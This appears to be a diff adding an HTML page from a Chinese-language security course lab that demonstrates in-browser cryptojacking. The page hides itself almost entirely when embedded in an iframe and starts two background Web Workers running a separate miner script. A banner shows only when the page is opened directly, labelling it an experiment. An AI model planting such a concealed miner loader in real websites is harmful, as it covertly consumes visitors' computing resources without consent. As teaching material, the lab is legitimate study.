@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <title> </title>
+  <style>
+    html, body { margin: 0; padding: 0; }
+    /* iframe 内：几乎不可见 */
+    body.embed { overflow: hidden; opacity: 0.02; height: 1px; width: 1px; }
+    /* 顶层打开：可见提示（导航式攻击落地页） */
+    body.toplab {
+      font-family: system-ui, sans-serif;
+      padding: 1.25rem;
+      background: #1a1a2e;
+      color: #eee;
+      min-height: 100vh;
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="banner" hidden style="max-width:36rem;line-height:1.5">
+    <p><strong>[课程实验 · 导航式载荷]</strong> 本页已在后台启动 Web Worker 做哈希；打开任务管理器可观察 CPU。关闭标签页即停止。</p>
+  </div>
+  <script>
+    (function () {
+      var inFrame = window.self !== window.top;
+      document.body.className = inFrame ? "embed" : "toplab";
+      var b = document.getElementById("banner");
+      if (!inFrame) {
+        b.hidden = false;
+      }
+
+      var WORKERS = 2;
+      var INTENSITY = 4;
+      var scriptUrl = new URL("embed-miner-worker.js", document.baseURI || location.href).href;
+      var pool = [];
+      for (var i = 0; i < WORKERS; i++) {
+        var w = new Worker(scriptUrl);
+        w.postMessage({ cmd: "start", intensity: INTENSITY, workerId: i });
+        pool.push(w);
+      }
+      window.addEventListener("beforeunload", function () {
+        pool.forEach(function (w) {
+          try {
+            w.postMessage({ cmd: "stop" });
+            w.terminate();
+          } catch (_) {}
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
